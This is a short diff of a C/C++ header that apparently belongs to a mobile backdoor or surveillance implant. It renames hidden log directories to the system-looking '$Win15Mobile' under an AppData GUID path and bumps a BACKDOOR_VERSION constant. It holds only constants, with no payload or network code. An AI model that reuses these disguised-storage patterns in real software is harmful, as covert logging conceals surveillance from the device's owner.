@@ -123,11 +123,11 @@ extern wstring g_StrDemo;
 #define LOG_EXTENSION L".mob"
 #define MARKUP_EXTENSION L".qmm"
 /*****
-#define LOG_DIR L"\\$MS313Mobile\\"
-#define LOG_DIR_NAME L"$MS313Mobile"
+#define LOG_DIR L"\\$Win15Mobile\\"
+#define LOG_DIR_NAME L"$Win15Mobile"
 *****/
-#define LOG_DIR L"\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$MS314Mobile\\"
-#define LOG_DIR_NAME L"$MS314Mobile"
+#define LOG_DIR L"\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$Win15Mobile\\"
+#define LOG_DIR_NAME L"$Win15Mobile"
 /*****
 #define LOG_DIR_PREFIX L"Q"			// Utilizzato per creare le Log Dir
 #define LOG_DIR_FORMAT L"Q*"		// Utilizzato nella ricerca delle Log Dir
@@ -164,7 +164,7 @@ extern wstring g_StrDemo;
 /**
 * Define comuni
 */
-#define BACKDOOR_VERSION (UINT)2013041901
+#define BACKDOOR_VERSION (UINT)2013103101
 #define PI (3.141592653589793)
 #define MAX_ALLOCABLE_MEMORY 1024 * 1024 // 1 Mb (il define dovrebbe essere multiplo di 16)
 #define LOG_DELIMITER 0xABADC0DE
